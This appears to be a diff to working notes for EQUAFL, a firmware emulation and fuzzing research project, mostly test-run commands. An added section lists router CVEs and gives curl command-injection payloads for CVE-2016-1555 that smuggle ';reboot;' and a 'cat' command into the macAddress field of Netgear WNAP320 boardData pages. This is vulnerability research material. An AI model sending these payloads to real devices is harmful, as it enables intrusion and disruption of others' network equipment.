@@ -73,6 +73,9 @@ pg_dump -U firmadyne -h localhost -t image_new -f EQUAFL_IMAGE_NEW firmware
 	python EQUAFL_setup.py 16385
 	python vul_run.py 16385 1 0 0 1 # get recv addr
 
+	# 2541
+	python vul_run.py 2541 1 3 0 2
+
 
 	# obtina keywords 	
  	# python2 ida_open_program.py 19061 httpd /home/yaowen/firmadyne/image_19061/
@@ -136,3 +139,55 @@ pg_dump -U firmadyne -h localhost -t image_new -f EQUAFL_IMAGE_NEW firmware
 
 	#python3 EQUAFL_test_parallel.py 5 18627 0
 	#python3 EQUAFL_test_parallel.py 5 18627 2
+
+	#python3 EQUAFL_test_parallel.py 5 16157 0
+	#python3 EQUAFL_test_parallel.py 5 16157 2
+
+
+	#python3 EQUAFL_test_parallel.py 5 20880 0  # 7858 server
+	#python3 EQUAFL_test_parallel.py 5 20880 2  # 7858 server
+
+	# python3 EQUAFL_test_parallel.py 5 19061 1  
+	# python3 EQUAFL_test_parallel.py 5 18627 1  
+
+	# python3 EQUAFL_test_parallel.py 5 19061 3
+	# python3 EQUAFL_test_parallel.py 5 18627 3
+
+	# python3 EQUAFL_test_parallel.py 5 16157 3
+	# python3 EQUAFL_test_parallel.py 5 20880 3
+	# python3 EQUAFL_test_parallel.py 5 19061 4
+
+	#10.30 second round, in the first round, the speed for mode 2 is slow (reason may be qemu-cmd or the server)
+	# python3 EQUAFL_test_parallel.py 5 19061 2
+	# python3 EQUAFL_test_parallel.py 5 18627 2
+
+
+# COMMAND INJECTION INFO
+	
+	DIR-825 CVE-2020-10213 command set_sta_enrollee_pin.cgi wps_sta_enrollee_pin
+	DIR-825 CVE-2020-10214 overflow ntp_sync.cgi ntp_server
+	DIR-825 CVE-2020-10215 command dns_query.cgi dns_query_name
+	DIR-825 CVE-2020-10216 command system_time.cgi date
+
+	13349, 'tew-673gru', 'FW100B36', CVE-2018-19239
+
+	https://packetstormsecurity.com/files/150693/TRENDnet-Command-Injection-Buffer-Overflow-Cross-Site-Scripting.html
+
+	2541, 'wnap320'  2.0 192.168.0.100 CVE-2016-1555
+	2540, 'wnap320'  2.0.3 example firmware in firmadyne
+	curl -L --max-redir 0 -m 5 -s -f -X POST -d "macAddress=000000000000;reboot;&reginfo=1&writeData=Submit" http://192.168.0.100/boardDataWW.php
+	curl -L --max-redir 0 -m 5 -s -f -X POST -d "macAddress=000000000000;reboot;&reginfo=1&writeData=Submit" http://192.168.0.100/boardDataNA.php
+
+	108841, 'wnap210v2' 192.168.0.236
+	curl -L --max-redir 0 -m 5 -s -f -X POST -d "macAddress=000000000000;cat DEADBEEF1;&reginfo=1&writeData=Submit" http://192.168.0.236/boardDataJP.php
+
+	20195 dir-865l cve-2018-6530 1-06 mipsel
+	1.08b01 has vulnerabiltiy
+	10132	DIR-865L_REVA_FIRMWARE_PATCH_1.08.B01.ZIP
+
+
+	./configure --target-list=mipsel-linux-user,mips-linux-user --static --disable-werror
+
+# root cause analysis
+
+	CVE-2016-1555  cmd sbin/lighttpd -> boardDataWW.php -> exec(wr_mfg_data) -> system
